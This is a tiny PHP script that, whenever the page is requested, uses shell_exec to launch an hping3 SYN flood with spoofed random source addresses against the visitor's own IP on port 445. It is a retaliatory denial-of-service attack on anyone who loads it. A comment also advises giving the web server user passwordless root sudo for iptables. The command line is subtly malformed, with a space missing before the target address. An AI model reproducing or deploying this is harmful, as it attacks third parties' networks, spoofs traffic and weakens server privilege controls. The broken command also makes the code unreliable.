<?php
    /* NOTE: you need to add the following to your sudoers file for any of this to work:
    *
    *    www-data   ALL= (root) NOPASSWD: /sbin/iptables
    *
    */


    // DROP IT - https://youtu.be/X3oOQ8XnQWU?t=1m14s
    shell_exec('hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source' . $_SERVER['REMOTE_ADDR']);
?>
